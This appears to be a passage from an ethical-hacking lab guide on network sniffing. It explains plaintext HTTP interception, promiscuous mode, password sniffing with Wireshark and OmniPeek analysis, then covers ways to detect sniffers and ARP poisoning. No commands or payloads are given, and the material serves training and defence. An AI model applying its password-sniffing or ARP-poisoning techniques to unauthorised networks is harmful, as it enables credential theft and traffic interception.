Data traversing an HTTP channel flows in plain-text format and is therefore prone to MITM attacks. Network administrators can use sniffers for helpful purposes such as to troubleshoot network problems, examine security problems, and debug protocol implementations. However, an attacker can use sniffing tools such as Wireshark to sniff the traffic flowing between the client and the server. The traffic obtained by the attacker might contain sensitive information such as login credentials, which can then be used to perform malicious activities such as user-session impersonation.

An attacker needs to manipulate the functionality of the switch to see all traffic passing through it. A packet sniffing program (also known as a sniffer) can only capture data packets from within a given subnet, which means that it cannot sniff packets from another network. Often, any laptop can plug into a network and gain access to it. Many enterprises leave their switch ports open. A packet sniffer placed on a network in promiscuous mode can capture and analyze all network traffic. Sniffing programs turn off the filter employed by Ethernet network interface cards (NICs) to prevent the host machine from seeing other stations’ traffic. Thus, sniffing programs can see everyone’s traffic.

The information gathered in the previous step may be insufficient to reveal the potential vulnerabilities of the target. There may be more information to help find loopholes in the target. An ethical hacker needs to perform network security assessments and suggest proper troubleshooting techniques to mitigate attacks. This lab provides hands-on experience of how to use sniffing tools to sniff network traffic and capture it on a remote interface.

### Perform Password Sniffing using Wireshark
Wireshark is a network packet analyzer used to capture network packets and display packet data in detail. The tool uses Winpcap to capture packets on its own supported networks. It captures live network traffic from Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI networks. The captured files can be programmatically edited via the command-line. A set of filters for customized data displays can be refined using a display filter.

##### Analyze a Network using the Omnipeek Network Protocol Analyzer
OmniPeek Network Analyzer provides real-time visibility and expert analysis of each part of the target network. It performs analysis, drills down, and fixes performance bottlenecks across multiple network segments. It includes analytic plug-ins that provide targeted visualization and search abilities.

### Detect Network Sniffing
Network sniffing involves using sniffer tools that enable the real-time monitoring and analysis of data packets flowing over computer networks. These network sniffers can be detected by using various techniques such as:

- **Ping Method**: Identifies if a system on the network is running in promiscuous mode
    
- **DNS Method**: Identifies sniffers in the network by analyzing the increase in network traffic
    
- **ARP Method**: Sends a non-broadcast ARP to all nodes in the network; a node on the network running in promiscuous mode will cache the local ARP address

##### Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network
ARP poisoning involves forging many ARP request and reply packets to overload a switch. ARP cache poisoning is the method of attacking a LAN network by updating the target computer’s ARP cache with both forged ARP request and reply packets designed to change the Layer 2 Ethernet MAC address (that of the network card) to one that the attacker can monitor. Attackers use ARP poisoning to sniff on the target network. Attackers can thus steal sensitive information, prevent network and web access, and perform DoS and MITM attacks.

Promiscuous mode allows a network device to intercept and read each network packet that arrives in its entirety. The sniffer toggles the NIC of a system to promiscuous mode, so that it listens to all data transmitted on its segment. A sniffer can constantly monitor all network traffic to a computer through the NIC by decoding the information encapsulated in the data packet. Promiscuous mode in the network can be detected using various tools.